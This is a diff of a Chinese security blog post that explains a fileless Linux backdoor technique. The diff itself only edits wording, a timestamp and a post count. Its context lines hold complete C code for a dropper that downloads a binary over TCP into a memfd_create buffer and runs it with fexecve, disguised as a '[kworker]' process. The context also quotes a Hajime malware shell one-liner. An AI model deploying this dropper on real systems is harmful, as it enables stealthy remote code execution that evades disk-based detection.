@@ -113,7 +113,7 @@
 <meta property="og:description" content="TD;DR 几周之前我看了这篇文章,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里linux进程注入)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话 1The current payload in use is a simple open/memfd_create/sendfile/fexecve program  我之前没有听过">
 <meta property="og:image" content="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/xeye.png">
 <meta property="og:image" content="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧/lsof.png">
-<meta property="og:updated_time" content="2018-02-23T06:44:16.614Z">
+<meta property="og:updated_time" content="2018-03-08T10:54:09.603Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="linux一种无文件后门技巧">
 <meta name="twitter:description" content="TD;DR 几周之前我看了这篇文章,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里linux进程注入)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话 1The current payload in use is a simple open/memfd_create/sendfile/fexecve program  我之前没有听过">
@@ -397,20 +397,20 @@
 <li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
 <li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
 <li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
-<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存取在磁盘上。</li>
+<li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
 <li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
 <ul>
-<li><p>让我们先来看一下这个代码吧</p>
+<li><p>让我们先来看一下这个代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
 </li>
 <li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
 <h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
 <li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
 <li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
-<li>我们使用了libc的syscall去对memfd_create进行了封装。</li>
+<li>我使用了libc的syscall去对memfd_create进行了封装。</li>
 <li>这个程序主要做了下面的事情</li>
 <li>1.创建了一个TCP socket</li>
 <li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
@@ -618,7 +618,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">160</span>
+                <span class="site-state-item-count">161</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
